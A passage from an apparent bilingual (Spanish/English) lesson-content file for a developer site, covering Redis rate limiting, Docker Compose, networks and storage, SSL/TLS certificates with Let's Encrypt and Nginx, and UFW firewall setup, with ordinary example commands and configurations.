| Transferencia | 10 | 1 hora | Requiere MFA adicional |
| Consulta saldo | 100 | 1 min | Solo rate limit |
| OTP request | 3 | 5 min | Bloqueo + notificación |

> 💡 Rate limiting con Redis protege contra ataques de fuerza bruta y credential stuffing, cumpliendo con requisitos de seguridad de PCI DSS.

---

## Practica

→ [Cache con Redis](/es/cooking/redis-cache)
    `,
    contentEn: `
## Cache and in-memory data

Redis stores data in RAM for ultra-fast access.

---

## Use cases

| Use | Why Redis |
|-----|-----------|
| **Cache** | Avoid slow queries |
| **Sessions** | User state |
| **Rate limiting** | Count requests |
| **Queues** | Background jobs |

---

## Installation

\`\`\`bash
# macOS
brew install redis
brew services start redis

# Docker
docker run -d --name redis -p 6379:6379 redis:7
\`\`\`

---

## Basic commands

\`\`\`bash
redis-cli

# Strings
SET user:1 "Ana"
GET user:1
SETEX token:abc 3600 "data"  # Expires in 1 hour

# Counters
INCR page:views
INCRBY api:calls 10

# Hashes
HSET user:1 name "Ana" email "ana@email.com"
HGETALL user:1
\`\`\`

---

## With Node.js

\`\`\`typescript
import { Redis } from 'ioredis'

const redis = new Redis()

// Cache
async function getUser(id: string) {
  const cached = await redis.get(\`user:\${id}\`)
  if (cached) return JSON.parse(cached)

  const user = await db.users.findUnique({ where: { id } })
  await redis.setex(\`user:\${id}\`, 3600, JSON.stringify(user))
  return user
}
\`\`\`

---

## 🏦 Fintech Case: Rate Limiting for APIs

Financial APIs are targets for brute force attacks and abuse. Redis is perfect for implementing **robust rate limiting**:

\`\`\`typescript
import { Redis } from 'ioredis'

const redis = new Redis()

// Sliding window rate limiter
async function checkRateLimit(userId: string, action: string): Promise<boolean> {
  const key = \`ratelimit:\${action}:\${userId}\`
  const now = Date.now()
  const windowMs = 60000 // 1 minute

  // Limits per action (stricter for sensitive operations)
  const limits: Record<string, number> = {
    'transfer': 5,      // 5 transfers/min
    'login': 10,        // 10 attempts/min
    'api_call': 100,    // 100 calls/min
    'otp_request': 3,   // 3 OTP codes/min
  }

  const limit = limits[action] || 60

  // Sliding window with sorted sets
  await redis.zremrangebyscore(key, 0, now - windowMs)
  const count = await redis.zcard(key)

  if (count >= limit) {
    // Log blocked attempt for security analysis
    await redis.lpush('security:blocked_requests', JSON.stringify({
      userId, action, timestamp: now, count
    }))
    return false // Blocked
  }

  await redis.zadd(key, now, \`\${now}\`)
  await redis.expire(key, 60)
  return true // Allowed
}

// Middleware for Express/Fastify
async function rateLimitMiddleware(req, res, next) {
  const userId = req.user?.id || req.ip
  const allowed = await checkRateLimit(userId, 'api_call')

  if (!allowed) {
    // Standard rate limiting headers
    res.set('Retry-After', '60')
    res.set('X-RateLimit-Limit', '100')
    res.set('X-RateLimit-Remaining', '0')
    return res.status(429).json({ error: 'Too many requests' })
  }

  next()
}
\`\`\`

### Strategies by operation

| Operation | Limit | Window | Action when exceeded |
|-----------|-------|--------|----------------------|
| Failed login | 5 | 15 min | Temp block + alert |
| Transfer | 10 | 1 hour | Require additional MFA |
| Balance check | 100 | 1 min | Rate limit only |
| OTP request | 3 | 5 min | Block + notification |

> 💡 Rate limiting with Redis protects against brute force and credential stuffing attacks, meeting PCI DSS security requirements.

---

## Practice

→ [Cache with Redis](/en/cooking/redis-cache)
    `,
  },
  'docker-compose': {
    contentEs: `
## Múltiples contenedores

Docker Compose orquesta múltiples contenedores como un solo sistema.

---

## docker-compose.yml

\`\`\`yaml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgres://postgres:secret@db:5432/mydb
    depends_on:
      - db
      - redis

  db:
    image: postgres:16
    environment:
      - POSTGRES_PASSWORD=secret
      - POSTGRES_DB=mydb
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7

volumes:
  postgres_data:
\`\`\`

---

## Comandos

\`\`\`bash
# Iniciar todo
docker compose up -d

# Ver logs
docker compose logs -f

# Parar
docker compose down

# Reconstruir
docker compose build --no-cache
docker compose up -d
\`\`\`

---

## Networking

Los servicios se comunican por nombre:

\`\`\`typescript
// Desde 'app', conectar a 'db'
const db = new Pool({
  host: 'db',  // Nombre del servicio
  port: 5432,
})
\`\`\`

---

## Practica

→ [Deploy con Docker](/es/cooking/docker-deploy)
    `,
    contentEn: `
## Multiple containers

Docker Compose orchestrates multiple containers as a single system.

---

## docker-compose.yml

\`\`\`yaml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgres://postgres:secret@db:5432/mydb
    depends_on:
      - db
      - redis

  db:
    image: postgres:16
    environment:
      - POSTGRES_PASSWORD=secret
      - POSTGRES_DB=mydb
    volumes:
      - postgres_data:/var/lib/postgresql/data

  redis:
    image: redis:7

volumes:
  postgres_data:
\`\`\`

---

## Commands

\`\`\`bash
# Start everything
docker compose up -d

# View logs
docker compose logs -f

# Stop
docker compose down

# Rebuild
docker compose build --no-cache
docker compose up -d
\`\`\`

---

## Networking

Services communicate by name:

\`\`\`typescript
// From 'app', connect to 'db'
const db = new Pool({
  host: 'db',  // Service name
  port: 5432,
})
\`\`\`

---

## Practice

→ [Deploy with Docker](/en/cooking/docker-deploy)
    `,
  },
  'docker-networks': {
    contentEs: `
## Redes en Docker

Docker crea redes virtuales para que los contenedores se comuniquen de forma aislada y segura.

---

## Tipos de redes

| Tipo | Descripción | Uso típico |
|------|-------------|------------|
| **bridge** | Red privada en el host | Default, desarrollo local |
| **host** | Comparte red del host | Máximo rendimiento |
| **overlay** | Red entre múltiples hosts | Docker Swarm, clusters |
| **none** | Sin red | Contenedores aislados |
| **macvlan** | IP propia en la red física | Integración con red existente |

---

## Bridge (default)

Cuando creas un contenedor sin especificar red, usa \`bridge\`:

\`\`\`bash
# Ver redes existentes
docker network ls

# Crear red personalizada
docker network create mi-red

# Correr contenedor en esa red
docker run -d --name app --network mi-red nginx
\`\`\`

---

## Comunicación entre contenedores

En la misma red, los contenedores se encuentran por **nombre**:

\`\`\`bash
# Crear red
docker network create backend

# Postgres en esa red
docker run -d --name db --network backend postgres:16

# App en la misma red - puede conectar a "db"
docker run -d --name api --network backend \\
  -e DATABASE_HOST=db \\
  mi-api
\`\`\`

\`\`\`typescript
// Desde 'api', conectar a 'db' por nombre
const pool = new Pool({
  host: 'db',  // Docker resuelve esto automáticamente
  port: 5432,
})
\`\`\`

---

## DNS interno de Docker

Docker tiene un servidor DNS interno que resuelve nombres de contenedores:

\`\`\`
┌─────────────────────────────────────────┐
│           Red: backend                  │
│                                         │
│  ┌─────────┐         ┌─────────┐       │
│  │   api   │  ─────▶ │   db    │       │
│  │         │  "db"   │         │       │
│  └─────────┘         └─────────┘       │
│                                         │
│  DNS interno resuelve "db" → 172.18.0.3│
└─────────────────────────────────────────┘
\`\`\`

---

## Inspeccionar red

\`\`\`bash
# Ver detalles de una red
docker network inspect mi-red

# Ver qué contenedores están en una red
docker network inspect mi-red --format '{{range .Containers}}{{.Name}} {{end}}'

# Ver IP de un contenedor
docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nombre-contenedor
\`\`\`

---

## Conectar/desconectar contenedores

\`\`\`bash
# Conectar contenedor existente a otra red
docker network connect mi-red contenedor

# Desconectar
docker network disconnect mi-red contenedor

# Un contenedor puede estar en múltiples redes
docker network connect frontend api
docker network connect backend api
\`\`\`

---

## Aislar por ambiente

\`\`\`bash
# Red para desarrollo
docker network create dev-net

# Red para producción (más segura)
docker network create --internal prod-net
# --internal = sin acceso a internet
\`\`\`

---

## En Docker Compose

\`\`\`yaml
version: '3.8'

services:
  frontend:
    image: nginx
    networks:
      - frontend-net

  api:
    image: node:20
    networks:
      - frontend-net
      - backend-net

  db:
    image: postgres:16
    networks:
      - backend-net  # Solo accesible desde api

networks:
  frontend-net:
  backend-net:
    internal: true  # Sin acceso a internet
\`\`\`

---

## Seguridad en redes

| Práctica | Por qué |
|----------|---------|
| Redes separadas por función | DB solo accesible desde API |
| \`--internal\` para backends | Sin acceso a internet |
| No exponer puertos innecesarios | Minimizar superficie de ataque |
| Usar nombres, no IPs | IPs cambian, nombres persisten |

---

## Troubleshooting

\`\`\`bash
# Ver si dos contenedores pueden comunicarse
docker exec api ping db

# Ver resolución DNS
docker exec api nslookup db

# Ver puertos abiertos
docker exec api netstat -tlnp
\`\`\`

---

## Recursos

- 📖 [Docker Networking](https://docs.docker.com/network/)
- 📖 [Network drivers](https://docs.docker.com/network/drivers/)

---

## Practica

→ [Lab de Redes Docker](/es/cooking/docker-network-lab)
    `,
    contentEn: `
## Docker Networks

Docker creates virtual networks so containers can communicate in an isolated and secure way.

---

## Network types

| Type | Description | Typical use |
|------|-------------|------------|
| **bridge** | Private network on host | Default, local development |
| **host** | Shares host network | Maximum performance |
| **overlay** | Network across multiple hosts | Docker Swarm, clusters |
| **none** | No network | Isolated containers |
| **macvlan** | Own IP on physical network | Integration with existing network |

---

## Bridge (default)

When you create a container without specifying a network, it uses \`bridge\`:

\`\`\`bash
# View existing networks
docker network ls

# Create custom network
docker network create my-network

# Run container on that network
docker run -d --name app --network my-network nginx
\`\`\`

---

## Communication between containers

On the same network, containers find each other by **name**:

\`\`\`bash
# Create network
docker network create backend

# Postgres on that network
docker run -d --name db --network backend postgres:16

# App on same network - can connect to "db"
docker run -d --name api --network backend \\
  -e DATABASE_HOST=db \\
  my-api
\`\`\`

\`\`\`typescript
// From 'api', connect to 'db' by name
const pool = new Pool({
  host: 'db',  // Docker resolves this automatically
  port: 5432,
})
\`\`\`

---

## Docker internal DNS

Docker has an internal DNS server that resolves container names:

\`\`\`
┌─────────────────────────────────────────┐
│           Network: backend              │
│                                         │
│  ┌─────────┐         ┌─────────┐       │
│  │   api   │  ─────▶ │   db    │       │
│  │         │  "db"   │         │       │
│  └─────────┘         └─────────┘       │
│                                         │
│  Internal DNS resolves "db" → 172.18.0.3│
└─────────────────────────────────────────┘
\`\`\`

---

## Inspect network

\`\`\`bash
# View network details
docker network inspect my-network

# See which containers are on a network
docker network inspect my-network --format '{{range .Containers}}{{.Name}} {{end}}'

# Get container IP
docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container-name
\`\`\`

---

## Connect/disconnect containers

\`\`\`bash
# Connect existing container to another network
docker network connect my-network container

# Disconnect
docker network disconnect my-network container

# A container can be on multiple networks
docker network connect frontend api
docker network connect backend api
\`\`\`

---

## Isolate by environment

\`\`\`bash
# Network for development
docker network create dev-net

# Network for production (more secure)
docker network create --internal prod-net
# --internal = no internet access
\`\`\`

---

## In Docker Compose

\`\`\`yaml
version: '3.8'

services:
  frontend:
    image: nginx
    networks:
      - frontend-net

  api:
    image: node:20
    networks:
      - frontend-net
      - backend-net

  db:
    image: postgres:16
    networks:
      - backend-net  # Only accessible from api

networks:
  frontend-net:
  backend-net:
    internal: true  # No internet access
\`\`\`

---

## Network security

| Practice | Why |
|----------|-----|
| Separate networks by function | DB only accessible from API |
| \`--internal\` for backends | No internet access |
| Don't expose unnecessary ports | Minimize attack surface |
| Use names, not IPs | IPs change, names persist |

---

## Troubleshooting

\`\`\`bash
# Check if two containers can communicate
docker exec api ping db

# Check DNS resolution
docker exec api nslookup db

# See open ports
docker exec api netstat -tlnp
\`\`\`

---

## Resources

- 📖 [Docker Networking](https://docs.docker.com/network/)
- 📖 [Network drivers](https://docs.docker.com/network/drivers/)

---

## Practice

→ [Docker Networks Lab](/en/cooking/docker-network-lab)
    `,
  },
  'docker-storage': {
    contentEs: `
## Storage en Docker

Los contenedores son efímeros: cuando mueren, sus datos desaparecen. Los volúmenes y bind mounts resuelven esto.

---

## El problema

\`\`\`
SIN VOLUMEN:
┌──────────────────┐
│   Contenedor     │
│  ┌────────────┐  │
│  │   Datos    │  │  ← Se pierden al eliminar
│  └────────────┘  │
└──────────────────┘

CON VOLUMEN:
┌──────────────────┐     ┌──────────────┐
│   Contenedor     │     │   Volumen    │
│  ┌────────────┐  │────▶│   (Host)     │
│  │   Datos    │  │     │   Persiste   │
│  └────────────┘  │     └──────────────┘
└──────────────────┘
\`\`\`

---

## Tipos de storage

| Tipo | Sintaxis | Uso |
|------|----------|-----|
| **Volume** | \`-v nombre:/path\` | Producción, Docker lo gestiona |
| **Bind mount** | \`-v /host/path:/container/path\` | Desarrollo, acceso directo |
| **tmpfs** | \`--tmpfs /path\` | Datos temporales en RAM |

---

## Volúmenes (recomendado)

Docker gestiona el almacenamiento:

\`\`\`bash
# Crear volumen
docker volume create postgres_data

# Usar en contenedor
docker run -d \\
  --name db \\
  -v postgres_data:/var/lib/postgresql/data \\
  postgres:16

# Los datos persisten aunque elimines el contenedor
docker rm -f db
docker run -d --name db2 -v postgres_data:/var/lib/postgresql/data postgres:16
# ¡Los datos siguen ahí!
\`\`\`

---

## Bind mounts (desarrollo)

Montas una carpeta de tu máquina directamente:

\`\`\`bash
# Código local → contenedor (hot reload)
docker run -d \\
  -v $(pwd)/src:/app/src \\
  -v $(pwd)/package.json:/app/package.json \\
  node:20 npm run dev

# Cambias código local → se refleja en contenedor
\`\`\`

---

## Comparación

| Aspecto | Volume | Bind Mount |
|---------|--------|------------|
| **Gestión** | Docker | Tú |
| **Ubicación** | /var/lib/docker/volumes | Cualquiera |
| **Backup** | \`docker volume\` | \`cp\`, \`rsync\` |
| **Rendimiento** | Optimizado | Depende del FS |
| **Portabilidad** | Alta | Baja |
| **Caso de uso** | Producción, DBs | Desarrollo |

---

## Comandos de volúmenes

\`\`\`bash
# Listar volúmenes
docker volume ls

# Inspeccionar (ver ubicación real)
docker volume inspect postgres_data

# Crear con opciones
docker volume create --driver local --opt type=none --opt o=bind --opt device=/data/postgres pgdata

# Eliminar volumen
docker volume rm postgres_data

# Eliminar volúmenes huérfanos
docker volume prune
\`\`\`

---

## Backup de volúmenes

\`\`\`bash
# Backup: crear tar desde contenedor temporal
docker run --rm \\
  -v postgres_data:/data \\
  -v $(pwd):/backup \\
  alpine tar czf /backup/postgres_backup.tar.gz -C /data .

# Restore: extraer tar a volumen
docker run --rm \\
  -v postgres_data:/data \\
  -v $(pwd):/backup \\
  alpine tar xzf /backup/postgres_backup.tar.gz -C /data
\`\`\`

---

## En Docker Compose

\`\`\`yaml
version: '3.8'

services:
  db:
    image: postgres:16
    volumes:
      - postgres_data:/var/lib/postgresql/data  # Named volume
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql  # Bind mount

  app:
    build: .
    volumes:
      - ./src:/app/src:ro  # :ro = read-only
      - node_modules:/app/node_modules  # Named volume para deps

volumes:
  postgres_data:
  node_modules:
\`\`\`

---

## Drivers de storage

| Driver | Uso |
|--------|-----|
| **local** | Default, filesystem local |
| **nfs** | Storage compartido en red |
| **amazon-ecs** | AWS EBS/EFS |
| **azure** | Azure File Storage |
| **convoy** | Snapshots y backup |

\`\`\`bash
# Volumen con NFS
docker volume create \\
  --driver local \\
  --opt type=nfs \\
  --opt o=addr=192.168.1.100,rw \\
  --opt device=:/shared \\
  nfs_volume
\`\`\`

---

## Mejores prácticas

| Práctica | Por qué |
|----------|---------|
| Volumes para producción | Docker los gestiona, más portable |
| Bind mounts solo en dev | Hot reload, edición directa |
| Nombrar volúmenes | \`db_data\` vs hash aleatorio |
| Backup regular | Los volúmenes son críticos |
| \`:ro\` cuando sea posible | Read-only = más seguro |
| No montar \`/\` o \`/etc\` | Riesgo de seguridad |

---

## Recursos

- 📖 [Docker Storage](https://docs.docker.com/storage/)
- 📖 [Volumes](https://docs.docker.com/storage/volumes/)
- 📖 [Bind mounts](https://docs.docker.com/storage/bind-mounts/)

---

## Practica

→ [Backup de Volúmenes Docker](/es/cooking/docker-backup)
    `,
    contentEn: `
## Docker Storage

Containers are ephemeral: when they die, their data disappears. Volumes and bind mounts solve this.

---

## The problem

\`\`\`
WITHOUT VOLUME:
┌──────────────────┐
│    Container     │
│  ┌────────────┐  │
│  │    Data    │  │  ← Lost when removed
│  └────────────┘  │
└──────────────────┘

WITH VOLUME:
┌──────────────────┐     ┌──────────────┐
│    Container     │     │    Volume    │
│  ┌────────────┐  │────▶│    (Host)    │
│  │    Data    │  │     │   Persists   │
│  └────────────┘  │     └──────────────┘
└──────────────────┘
\`\`\`

---

## Storage types

| Type | Syntax | Use |
|------|--------|-----|
| **Volume** | \`-v name:/path\` | Production, Docker manages it |
| **Bind mount** | \`-v /host/path:/container/path\` | Development, direct access |
| **tmpfs** | \`--tmpfs /path\` | Temporary data in RAM |

---

## Volumes (recommended)

Docker manages the storage:

\`\`\`bash
# Create volume
docker volume create postgres_data

# Use in container
docker run -d \\
  --name db \\
  -v postgres_data:/var/lib/postgresql/data \\
  postgres:16

# Data persists even if you delete the container
docker rm -f db
docker run -d --name db2 -v postgres_data:/var/lib/postgresql/data postgres:16
# Data is still there!
\`\`\`

---

## Bind mounts (development)

Mount a folder from your machine directly:

\`\`\`bash
# Local code → container (hot reload)
docker run -d \\
  -v $(pwd)/src:/app/src \\
  -v $(pwd)/package.json:/app/package.json \\
  node:20 npm run dev

# Change local code → reflects in container
\`\`\`

---

## Comparison

| Aspect | Volume | Bind Mount |
|--------|--------|------------|
| **Management** | Docker | You |
| **Location** | /var/lib/docker/volumes | Anywhere |
| **Backup** | \`docker volume\` | \`cp\`, \`rsync\` |
| **Performance** | Optimized | Depends on FS |
| **Portability** | High | Low |
| **Use case** | Production, DBs | Development |

---

## Volume commands

\`\`\`bash
# List volumes
docker volume ls

# Inspect (see real location)
docker volume inspect postgres_data

# Create with options
docker volume create --driver local --opt type=none --opt o=bind --opt device=/data/postgres pgdata

# Delete volume
docker volume rm postgres_data

# Delete orphan volumes
docker volume prune
\`\`\`

---

## Backup volumes

\`\`\`bash
# Backup: create tar from temporary container
docker run --rm \\
  -v postgres_data:/data \\
  -v $(pwd):/backup \\
  alpine tar czf /backup/postgres_backup.tar.gz -C /data .

# Restore: extract tar to volume
docker run --rm \\
  -v postgres_data:/data \\
  -v $(pwd):/backup \\
  alpine tar xzf /backup/postgres_backup.tar.gz -C /data
\`\`\`

---

## In Docker Compose

\`\`\`yaml
version: '3.8'

services:
  db:
    image: postgres:16
    volumes:
      - postgres_data:/var/lib/postgresql/data  # Named volume
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql  # Bind mount

  app:
    build: .
    volumes:
      - ./src:/app/src:ro  # :ro = read-only
      - node_modules:/app/node_modules  # Named volume for deps

volumes:
  postgres_data:
  node_modules:
\`\`\`

---

## Storage drivers

| Driver | Use |
|--------|-----|
| **local** | Default, local filesystem |
| **nfs** | Shared network storage |
| **amazon-ecs** | AWS EBS/EFS |
| **azure** | Azure File Storage |
| **convoy** | Snapshots and backup |

\`\`\`bash
# Volume with NFS
docker volume create \\
  --driver local \\
  --opt type=nfs \\
  --opt o=addr=192.168.1.100,rw \\
  --opt device=:/shared \\
  nfs_volume
\`\`\`

---

## Best practices

| Practice | Why |
|----------|-----|
| Volumes for production | Docker manages them, more portable |
| Bind mounts only in dev | Hot reload, direct editing |
| Name your volumes | \`db_data\` vs random hash |
| Regular backup | Volumes are critical |
| \`:ro\` when possible | Read-only = more secure |
| Don't mount \`/\` or \`/etc\` | Security risk |

---

## Resources

- 📖 [Docker Storage](https://docs.docker.com/storage/)
- 📖 [Volumes](https://docs.docker.com/storage/volumes/)
- 📖 [Bind mounts](https://docs.docker.com/storage/bind-mounts/)

---

## Practice

→ [Docker Volumes Backup](/en/cooking/docker-backup)
    `,
  },
  'ssl-certificates': {
    contentEs: `
## Certificados SSL/TLS

HTTPS protege la comunicación entre el navegador y tu servidor. Los certificados SSL/TLS son la base de esta seguridad.

---

## ¿Por qué HTTPS?

| Sin HTTPS | Con HTTPS |
|-----------|-----------|
| Datos visibles en la red | Datos encriptados |
| Cualquiera puede interceptar | Solo origen y destino leen |
| Sin verificación de identidad | Certificado verifica quién eres |
| SEO penalizado | SEO favorecido |
| Navegadores muestran "No seguro" | Candado verde |

---

## Cómo funciona

\`\`\`
1. Cliente → Servidor: "Quiero conexión segura"
2. Servidor → Cliente: "Aquí está mi certificado"
3. Cliente verifica:
   - ¿Lo firmó una CA confiable?
   - ¿El dominio coincide?
   - ¿No está expirado?
4. Intercambian claves de sesión
5. Comunicación encriptada
\`\`\`

---

## Anatomía de un certificado

\`\`\`bash
# Ver certificado de un sitio
openssl s_client -connect luxia.us:443 -servername luxia.us 2>/dev/null | openssl x509 -text -noout
\`\`\`

Campos importantes:

| Campo | Descripción |
|-------|-------------|
| **Subject** | A quién pertenece (CN=dominio) |
| **Issuer** | Quién lo firmó (CA) |
| **Validity** | Fechas de inicio y expiración |
| **Public Key** | Clave pública del servidor |
| **SAN** | Subject Alternative Names (dominios adicionales) |

---

## Tipos de certificados

| Tipo | Validación | Tiempo | Precio | Uso |
|------|------------|--------|--------|-----|
| **DV** (Domain) | Solo dominio | Minutos | Gratis-$50 | Blogs, apps personales |
| **OV** (Organization) | Empresa verificada | Días | $50-200 | Empresas |
| **EV** (Extended) | Verificación exhaustiva | Semanas | $200-500 | Bancos, e-commerce |
| **Wildcard** | *.dominio.com | Variable | Variable | Múltiples subdominios |

---

## Cadena de confianza

\`\`\`
┌─────────────────────────────┐
│     Root CA (Raíz)          │  ← Preinstalada en navegadores/OS
│   (DigiCert, Let's Encrypt) │
└──────────────┬──────────────┘
               │ firma
               ▼
┌─────────────────────────────┐
│   Intermediate CA           │  ← CA intermedia
│   (Let's Encrypt R3)        │
└──────────────┬──────────────┘
               │ firma
               ▼
┌─────────────────────────────┐
│   Tu certificado            │  ← El que usas en tu servidor
│   (luxia.us)                │
└─────────────────────────────┘
\`\`\`

---

## Let's Encrypt (gratis)

Certificados DV gratuitos y automáticos:

\`\`\`bash
# Instalar Certbot
apt install certbot

# Obtener certificado (standalone)
certbot certonly --standalone -d tudominio.com -d www.tudominio.com

# Con Nginx
certbot --nginx -d tudominio.com

# Renovar automáticamente
certbot renew --dry-run
\`\`\`

---

## Archivos del certificado

| Archivo | Contenido |
|---------|-----------|
| \`fullchain.pem\` | Certificado + intermedios |
| \`privkey.pem\` | Clave privada (¡SECRETA!) |
| \`cert.pem\` | Solo tu certificado |
| \`chain.pem\` | Solo intermedios |

\`\`\`bash
# Ubicación típica (Let's Encrypt)
ls /etc/letsencrypt/live/tudominio.com/
\`\`\`

---

## Configurar Nginx

\`\`\`nginx
server {
    listen 443 ssl http2;
    server_name tudominio.com;

    ssl_certificate /etc/letsencrypt/live/tudominio.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/tudominio.com/privkey.pem;

    # Configuración moderna
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers off;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;

    # HSTS (forzar HTTPS)
    add_header Strict-Transport-Security "max-age=31536000" always;
}

# Redireccionar HTTP → HTTPS
server {
    listen 80;
    server_name tudominio.com;
    return 301 https://$host$request_uri;
}
\`\`\`

---

## Renovación automática

Let's Encrypt expira cada 90 días. Automatiza:

\`\`\`bash
# Agregar cron
crontab -e

# Renovar cada día a las 3am
0 3 * * * certbot renew --quiet --post-hook "systemctl reload nginx"
\`\`\`

---

## Troubleshooting

| Error | Causa | Solución |
|-------|-------|----------|
| ERR_CERT_DATE_INVALID | Expirado | \`certbot renew\` |
| ERR_CERT_AUTHORITY_INVALID | CA no confiable | Verifica cadena completa |
| ERR_CERT_COMMON_NAME_INVALID | Dominio no coincide | Regenerar con SAN correcto |
| Mixed content | HTTP en página HTTPS | Cambiar todos los recursos a HTTPS |

\`\`\`bash
# Verificar certificado
openssl x509 -in cert.pem -text -noout

# Verificar conexión
openssl s_client -connect tudominio.com:443

# Verificar expiración
echo | openssl s_client -connect tudominio.com:443 2>/dev/null | openssl x509 -noout -dates
\`\`\`

---

## Recursos

- 📖 [Let's Encrypt Docs](https://letsencrypt.org/docs/)
- 📖 [SSL Labs Test](https://www.ssllabs.com/ssltest/)
- 📖 [Mozilla SSL Config Generator](https://ssl-config.mozilla.org/)

---

## Practica

→ [SSL con Let's Encrypt](/es/cooking/ssl-certbot)
    `,
    contentEn: `
## SSL/TLS Certificates

HTTPS protects communication between the browser and your server. SSL/TLS certificates are the foundation of this security.

---

## Why HTTPS?

| Without HTTPS | With HTTPS |
|---------------|------------|
| Data visible on network | Encrypted data |
| Anyone can intercept | Only origin and destination read |
| No identity verification | Certificate verifies who you are |
| SEO penalized | SEO favored |
| Browsers show "Not secure" | Green padlock |

---

## How it works

\`\`\`
1. Client → Server: "I want a secure connection"
2. Server → Client: "Here's my certificate"
3. Client verifies:
   - Did a trusted CA sign it?
   - Does the domain match?
   - Is it not expired?
4. Exchange session keys
5. Encrypted communication
\`\`\`

---

## Anatomy of a certificate

\`\`\`bash
# View a site's certificate
openssl s_client -connect luxia.us:443 -servername luxia.us 2>/dev/null | openssl x509 -text -noout
\`\`\`

Important fields:

| Field | Description |
|-------|-------------|
| **Subject** | Who it belongs to (CN=domain) |
| **Issuer** | Who signed it (CA) |
| **Validity** | Start and expiration dates |
| **Public Key** | Server's public key |
| **SAN** | Subject Alternative Names (additional domains) |

---

## Certificate types

| Type | Validation | Time | Price | Use |
|------|------------|------|-------|-----|
| **DV** (Domain) | Domain only | Minutes | Free-$50 | Blogs, personal apps |
| **OV** (Organization) | Verified company | Days | $50-200 | Companies |
| **EV** (Extended) | Exhaustive verification | Weeks | $200-500 | Banks, e-commerce |
| **Wildcard** | *.domain.com | Variable | Variable | Multiple subdomains |

---

## Chain of trust

\`\`\`
┌─────────────────────────────┐
│     Root CA                 │  ← Pre-installed in browsers/OS
│   (DigiCert, Let's Encrypt) │
└──────────────┬──────────────┘
               │ signs
               ▼
┌─────────────────────────────┐
│   Intermediate CA           │  ← Intermediate CA
│   (Let's Encrypt R3)        │
└──────────────┬──────────────┘
               │ signs
               ▼
┌─────────────────────────────┐
│   Your certificate          │  ← The one you use on your server
│   (luxia.us)                │
└─────────────────────────────┘
\`\`\`

---

## Let's Encrypt (free)

Free and automatic DV certificates:

\`\`\`bash
# Install Certbot
apt install certbot

# Get certificate (standalone)
certbot certonly --standalone -d yourdomain.com -d www.yourdomain.com

# With Nginx
certbot --nginx -d yourdomain.com

# Renew automatically
certbot renew --dry-run
\`\`\`

---

## Certificate files

| File | Content |
|------|---------|
| \`fullchain.pem\` | Certificate + intermediates |
| \`privkey.pem\` | Private key (SECRET!) |
| \`cert.pem\` | Just your certificate |
| \`chain.pem\` | Just intermediates |

\`\`\`bash
# Typical location (Let's Encrypt)
ls /etc/letsencrypt/live/yourdomain.com/
\`\`\`

---

## Configure Nginx

\`\`\`nginx
server {
    listen 443 ssl http2;
    server_name yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;

    # Modern configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers off;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;

    # HSTS (force HTTPS)
    add_header Strict-Transport-Security "max-age=31536000" always;
}

# Redirect HTTP → HTTPS
server {
    listen 80;
    server_name yourdomain.com;
    return 301 https://$host$request_uri;
}
\`\`\`

---

## Automatic renewal

Let's Encrypt expires every 90 days. Automate:

\`\`\`bash
# Add cron
crontab -e

# Renew every day at 3am
0 3 * * * certbot renew --quiet --post-hook "systemctl reload nginx"
\`\`\`

---

## Troubleshooting

| Error | Cause | Solution |
|-------|-------|----------|
| ERR_CERT_DATE_INVALID | Expired | \`certbot renew\` |
| ERR_CERT_AUTHORITY_INVALID | Untrusted CA | Verify full chain |
| ERR_CERT_COMMON_NAME_INVALID | Domain doesn't match | Regenerate with correct SAN |
| Mixed content | HTTP on HTTPS page | Change all resources to HTTPS |

\`\`\`bash
# Verify certificate
openssl x509 -in cert.pem -text -noout

# Verify connection
openssl s_client -connect yourdomain.com:443

# Check expiration
echo | openssl s_client -connect yourdomain.com:443 2>/dev/null | openssl x509 -noout -dates
\`\`\`

---

## Resources

- 📖 [Let's Encrypt Docs](https://letsencrypt.org/docs/)
- 📖 [SSL Labs Test](https://www.ssllabs.com/ssltest/)
- 📖 [Mozilla SSL Config Generator](https://ssl-config.mozilla.org/)

---

## Practice

→ [SSL with Let's Encrypt](/en/cooking/ssl-certbot)
    `,
  },
  'server-security': {
    contentEs: `
## Seguridad de Servidor

Un VPS expuesto a internet recibe ataques constantemente. UFW, fail2ban y buenas prácticas de SSH son tu primera línea de defensa.

---

## La realidad

\`\`\`bash
# Después de 1 hora de tener un VPS nuevo
cat /var/log/auth.log | grep "Failed password" | wc -l
# → 847 intentos de login fallidos
\`\`\`

Bots escanean constantemente buscando:
- SSH con contraseñas débiles
- Puertos abiertos innecesarios
- Servicios vulnerables

---

## UFW (Firewall)

UFW = Uncomplicated Firewall. Controla qué tráfico entra y sale.

\`\`\`bash
# Instalar
apt install ufw

# Política por defecto: bloquear todo
ufw default deny incoming
ufw default allow outgoing

# Permitir SSH (¡IMPORTANTE! Si no, te quedas fuera)
ufw allow ssh
# o específico: ufw allow 22/tcp

# Permitir HTTP/HTTPS
ufw allow 80/tcp
ufw allow 443/tcp

# Activar
ufw enable

# Ver estado
ufw status verbose
\`\`\`

---

## Reglas comunes UFW

\`\`\`bash
# Permitir puerto específico
ufw allow 3000/tcp

# Permitir rango de puertos
ufw allow 6000:6007/tcp

# Permitir desde IP específica
ufw allow from 192.168.1.100

# Permitir desde IP a puerto específico
ufw allow from 192.168.1.100 to any port 22

# Denegar IP (bloquear atacante)
ufw deny from 203.0.113.5

# Eliminar regla
ufw delete allow 3000/tcp

# Ver reglas numeradas (para eliminar)
ufw status numbered
ufw delete 3
\`\`\`

---

## fail2ban
